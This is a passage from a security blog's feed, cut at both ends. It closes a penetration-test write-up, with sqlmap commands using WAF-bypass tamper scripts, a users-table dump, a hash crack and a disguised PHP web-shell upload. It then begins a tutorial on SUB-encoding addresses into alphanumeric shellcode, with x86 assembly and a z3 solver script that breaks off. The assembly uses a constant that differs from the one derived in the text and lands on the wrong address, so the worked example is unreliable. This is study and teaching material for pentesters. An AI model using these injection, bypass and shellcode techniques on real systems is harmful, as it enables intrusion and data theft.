&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/domaintoshell/sqlmap1.png&quot; alt=&quot;Not here, baby&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Our first thought was that there was some kind of WAF protecting the system. But was it?&lt;/p&gt;

&lt;h2 id=&quot;some-more-flags&quot;&gt;Some more flags&lt;/h2&gt;
&lt;p&gt;The cool thing about cool tools like &lt;code class=&quot;highlighter-rouge&quot;&gt;SQLmap&lt;/code&gt; is that they help a lot but only if you help them first. So we did our homework and found out that the database system being used was MySQL. We found it after locating a database connection error message in another page (remember this was a legacy and forgotten system).&lt;/p&gt;

&lt;p&gt;We also tweaked the tool a little hoping to bypass the WAF.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u http://sub.domain.com/querydb.php --data=&quot;express=a&amp;amp;submit=Find&quot; --random-agent --dbms=mysql --dbs
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;But again, no luck. We also tried to use the &lt;code class=&quot;highlighter-rouge&quot;&gt;--identify-waf&lt;/code&gt; option, but the result was &lt;code class=&quot;highlighter-rouge&quot;&gt;Generic (Unknown)&lt;/code&gt;. Not very helpful.&lt;/p&gt;

&lt;p&gt;Anyway, I was convinced this application was SQLinj vuln so I tried a little harder.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u http://sub.domain.com/querydb.php --data=&quot;express=a&amp;amp;submit=Find&quot; --random-agent --dbms=mysql --dbs --risk 3 --level 5
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Still nothing. The WAF was definetly the problem.&lt;/p&gt;

&lt;h2 id=&quot;tampering&quot;&gt;Tampering&lt;/h2&gt;
&lt;p&gt;The solution to this problem was to use the &lt;code class=&quot;highlighter-rouge&quot;&gt;--tamper&lt;/code&gt; option. We basically encoded our payload so the WAF would not detect us. I started with a simple &lt;code class=&quot;highlighter-rouge&quot;&gt;between&lt;/code&gt; encoder and the result was better. A few tests were successfully completed, although most were not. So I added a few more tamper scripts, although I was afraid my requests were getting way too large.&lt;/p&gt;

&lt;p&gt;Surprisingly enough, it worked flawlessly.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u http://sub.domain.com/querydb.php --data=&quot;express=a&amp;amp;submit=Find&quot; --random-agent --dbms=mysql --dbs --risk 3 --level 5 --tamper=&quot;between,bluecoat,charencode&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I just had to adjust the timing, so the final command became:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u http://sub.domain.com/querydb.php --data=&quot;express=a&amp;amp;submit=Find&quot; --random-agent --dbms=mysql --dbs --risk 3 --level 5 --tamper=&quot;between,bluecoat,charencode&quot; --threads 7 --time-sec=2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bingo! We could dump a &lt;code class=&quot;highlighter-rouge&quot;&gt;users&lt;/code&gt; table and crack the admin hash.&lt;/p&gt;

&lt;h1 id=&quot;getting-the-shell&quot;&gt;Getting the shell&lt;/h1&gt;
&lt;p&gt;From this point on it was actually easy,  nothing new. Once we got access to the admin panel, we saw there was a place to upload files. So we did the good and old &lt;code class=&quot;highlighter-rouge&quot;&gt;shell.php.png&lt;/code&gt;, which worked like a charm. Yes, in 2018.&lt;/p&gt;

&lt;p&gt;Fortunately (for us, of course), this broken application was hosted in the very same server as another critical application, which had no blatant vulnerabilities. We managed to exfiltrate some confidential documents within the scope of the test and declare game over.&lt;/p&gt;

&lt;h2 id=&quot;final-thoughts&quot;&gt;Final thoughts&lt;/h2&gt;
&lt;p&gt;It is extremely important to have all your assets under control. If there is a useless application online, take it down. No matter how hard it is to beat your main server/application, your chain will be just as strong as its weakest link. 
Also, do not underestimate the existence bizarre legacy stuff, even in security aware corporations. As a pentester it is your obligation to always look first for the lower hanging fruit.&lt;/p&gt;

&lt;p&gt;Automated tools can help a lot, but only if you know how to use them properly. That means knowing what part of the process is the tool’s responsibility and what is yours. Never let any tool rule the game, you must always have knowledge and control of each and every action of anything under your responsibility.&lt;/p&gt;

&lt;p&gt;Finally, do try harder. It generally pays off :)&lt;/p&gt;
</description>
				<pubDate>Sat, 06 Oct 2018 00:00:00 -0300</pubDate>
				<link>/pentest/2018/10/06/sqlinj-pentest.html</link>
				<guid isPermaLink="true">/pentest/2018/10/06/sqlinj-pentest.html</guid>
			</item>
		
			<item>
				<title>SUB encoding</title>
				<description>&lt;p&gt;Sometimes during the exploit development you may find yourself in a situation where you need to write an address to a buffer but some of its bytes are badchars. An interesting approach is to manually encode the address using only &lt;code class=&quot;highlighter-rouge&quot;&gt;SUB&lt;/code&gt; operations and a bit of arithmetics. You can find a great explanation &lt;a href=&quot;https://vellosec.net/2018/08/carving-shellcode-using-restrictive-character-sets/&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Suppose &lt;code class=&quot;highlighter-rouge&quot;&gt;ESP&lt;/code&gt; points to the address &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1035E8EA&lt;/code&gt; but for some reason you need it to point to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1035FFB4&lt;/code&gt;. However you can only use alphanumeric characters. If you try simply to &lt;code class=&quot;highlighter-rouge&quot;&gt;mov ESP, 0x1035FFB4&lt;/code&gt; you will most certainly face a badchar hell. However, if you subtract &lt;code class=&quot;highlighter-rouge&quot;&gt;X&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;ESP&lt;/code&gt; you might wrap up into the desired address &lt;code class=&quot;highlighter-rouge&quot;&gt;ESP'&lt;/code&gt;. Here is what I mean:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ESP' = ESP - X
X = ESP - ESP'
X = 0 + ESP - ESP'
X = (0xFFFFFFFF + 1) + ESP - ESP'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In our example:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;X = 0xFFFFFFFF + 1 + 0x1035E8EA - 0x1035FFB4
X = 0xFFFFE936
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now all we have to do is finding a few numbers (32 bits each) that sum up to &lt;code class=&quot;highlighter-rouge&quot;&gt;X&lt;/code&gt;. Let’s pick 3 of such numbers:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;X = A + B + C
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Since we want alphanumeric bytes, a nice trick is to divide each byte in &lt;code class=&quot;highlighter-rouge&quot;&gt;X&lt;/code&gt; for 3. This will give us number close to the valid interval we want. After that we can adjust the values to get exactly the byte we want. For example:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x6F/3 = 0x23
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The problem is: what if our byte is too small and dividing it by three drives us even further away from the desired interval? In this case we can multiply it by 0x100 and use the carry in the next byte computation. That is why it is extremely important to start from the least significant byte.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x36/3 = 0x12
# Mutiply by 0x100
0x136/3 = 0x67.555...

a4 = 0x64
b4 = 0x65
c4 = 0x6D
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Notice how we had to adjust &lt;code class=&quot;highlighter-rouge&quot;&gt;C&lt;/code&gt; due to the fact that 0x112 is not a mulitple of 3. Also, since there is a carry, the next byte will be reduced by 1.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0xE8/3 = 0x4D.555...

a3 = 0x4A
b3 = 0x4B
c3 = 0x53
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The next 2 bytes will be the same:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0xFF = 0x55

a1 = a2 = 0x55
b1 = b2 = 0x55
c1 = c2 = 0x55
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally, here are our numbers:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;A = 0x55554A64
B = 0x55554B65
C = 0x5555536D
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Converting it into x86 instructions:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;push esp                ;esp = 0x1035E8EA
pop eax                 ;get ESP in EAX
sub eax, 0x55554A64     ;eax = 0xBAE09E86
sub eax, 0x55554A65     ;eax = 0x658B5421
sub eax, 0x5555536D     ;eax = 0x103600B4
push eax
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A very useful application of this techinique comes up if we consider that instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;ESP&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ESP'&lt;/code&gt; we choose another register, ie &lt;code class=&quot;highlighter-rouge&quot;&gt;EAX&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;EAX'&lt;/code&gt;, with &lt;code class=&quot;highlighter-rouge&quot;&gt;EAX = 0&lt;/code&gt;. That means that by zeroing &lt;code class=&quot;highlighter-rouge&quot;&gt;EAX&lt;/code&gt; out, we can encode any address we want. For instance:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;EAX = 0
EAX' = 0x6c6e2177

X = 0xFFFFFFFF + 1 + 0 - EAX' 
X = 0x9391DE89
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Applying the same algorithm we can get the following numbers:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;A = 0x4b3b422d
B = 0x2128403b
C = 0x272e5c21
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;automating-with-z3-z3ncoder&quot;&gt;Automating with z3 (z3ncoder)&lt;/h1&gt;
&lt;blockquote&gt;
  &lt;p&gt;Z3 is a theorem prover from Microsoft Research. It is licensed under the MIT license.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Z3 is an awesomer tool that uses SMT/SAT solving techinques to prove multiple kinds of theorems. But worry not: it is way simpler to use than it sounds from the description.&lt;/p&gt;

&lt;p&gt;There is a python module named &lt;code class=&quot;highlighter-rouge&quot;&gt;z3-solver&lt;/code&gt; that makes our life really easier. In short, all you have to do is to define a few constraints and let it give you a model. I created a simple script named &lt;a href=&quot;https://github.com/marcosValle/z3ncoder&quot;&gt;z3ncoder&lt;/a&gt; to illustrate what I mean.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;z3&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;argparse&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;solve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;x1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'x1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;x2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'x2'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;x3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'x3'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;x4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'x4'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;y1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'y1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;y2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'y2'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;y3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'y3'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;y4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'y4'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;z1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'z1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;z2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'z2'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;z3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'z3'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;z4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'z4'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;X&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'X'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;Y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Y'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;Z&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Z'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Solver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Or&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;X&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Y&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Z&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;X&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Y&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Z&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100000000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;X&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
